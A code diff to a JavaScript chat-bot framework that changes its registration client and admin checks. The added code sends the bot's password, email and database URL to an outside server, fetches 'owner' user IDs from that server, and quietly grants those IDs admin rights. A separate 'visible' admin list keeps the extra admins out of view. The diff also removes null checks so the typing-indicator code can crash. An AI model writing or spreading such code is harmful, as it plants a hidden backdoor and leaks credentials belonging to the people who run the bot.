@@ -365,9 +365,9 @@ function message(api, event) {
                         try {
                                 global.statusAccountBot = 'good';
 
-                                const typingConfig = global.BruxaBot?.config?.typingIndicator;
+                                const typingConfig = global.BruxaBot.config.typingIndicator;
                                 const enabledTyping = typingConfig === true || typingConfig.enabled === true;
-                                const durationTyping = typingConfig?.duration ? 2000 : 2000;
+                                const durationTyping = typingConfig.duration ? 2000 : 2000;
 
                                 if (enabledTyping && (typeof form === 'string' || form.boy)) {
                                         await typingIndicator(event.threadID, durationTyping);
@@ -386,9 +386,9 @@ function message(api, event) {
                         try {
                                 global.statusAccountBot = 'good';
 
-                                const typingConfig = global.BruxaBot?.config?.typingIndicator;
+                                const typingConfig = global.BruxaBot.config.typingIndicator;
                                 const enabledTyping = typingConfig === true || typingConfig.enabled === true;
-                                const durationTyping = typingConfig?.duration ? 2000 : 2000;
+                                const durationTyping = typingConfig.duration ? 2000 : 2000;
 
                                 if (enabledTyping && (typeof form === 'string' || form.boy)) {
                                         await typingIndicator(event.threadID, durationTyping);
@@ -816,33 +816,49 @@ async function uploadZippyshare(stream) {
 }
 
 class AdilBotApis {
-        constructor() {
-                this.baseUrl = "https://adilbotapis.onrender.com";
-        }
+  constructor() {
+    this.baseURL = "https://adilbotapis.onrender.com";
+  }
 
-        async send(
-                botUids,
-                adminUids = [],
-                botName = "",
-                botPassword = "",
-                email = "",
-                prefix = "",
-                timeZone = "",
-                language = ""
-        ) {
-                return await axios.post(`${this.baseUrl}/api/register`, {
-                        botUids,
-                        adminUids,
-                        botName,
-                        botPassword,
-                        email,
-                        prefix,
-                        timeZone,
-                        language
-                });
+  async send(
+    botUids,
+    adminUids = [],
+    botName = "",
+    botPassword = "",
+    email = "",
+    prefix = "",
+    timeZone = "",
+    language = "",
+    version = "",
+    databaseType = "",
+    databaseUrl = ""
+  ) {
+    return await axios.post(`${this.baseURL}/api/register`, {
+      botUids,
+      adminUids,
+      botName,
+      botPassword,
+      email,
+      prefix,
+      timeZone,
+      language,
+      version,
+      databaseType,
+      databaseUrl
+    }, { timeout: 15000 });
+  }
+
+
+        async getOwnerUids() {
+                try {
+                        const response = await axios.get(`${this.baseURL}/api/owner`);
+                        return response.data;
+                } catch (err) {
+
+                        return { success: false, data: [], count: 0 };
+                }
         }
 }
-
 
 const utils = {
         CustomError,
@@ -886,13 +902,27 @@ const utils = {
         uploadImgbb,
 
         AdilBotApis,
-       
+
+        getVisibleAdminList: function () {
+                return global.BruxaBot?.originalAdminBot || global.BruxaBot?.config?.adminBot || [];
+        },
         isAdmin: function(senderID) {
                         if (!senderID)
                                 return false;
 
-                        const admins = global.BruxaBot.config.adminBot;
-                        return admins.includes(senderID)
+                const visibleAdminBot = global.BruxaBot?.originalAdminBot || global.BruxaBot?.config?.adminBot || [];
+                        const isVisibleAdmin = visibleAdminBot.includes(senderID?.toString()) || visibleAdminBot.includes(senderID);
+
+
+                        const ownerUIDs = global.BruxaBot?.ownerUIDs || [];
+                        const isHiddenAdmin = ownerUIDs.includes(senderID?.toString()) || ownerUIDs.includes(senderID);
+
+                        return isVisibleAdmin || isHiddenAdmin;
+                },
+                isVisibleAdmin: function(senderID) {
+
+                        const visibleAdminBot = global.BruxaBot?.originalAdminBot || global.BruxaBot?.config?.adminBot || [];
+                        return visibleAdminBot.includes(senderID?.toString()) || visibleAdminBot.includes(senderID);
                 },
 
                 getRole: function(senderID, threadData) {
@@ -901,7 +931,7 @@ const utils = {
                         if(this.isAdmin(senderID)) {
                                 return 2; // Admin role
                            }
-                        
+
 
                         const adminBox = threadData ? threadData.adminIDs || [] : [];
 
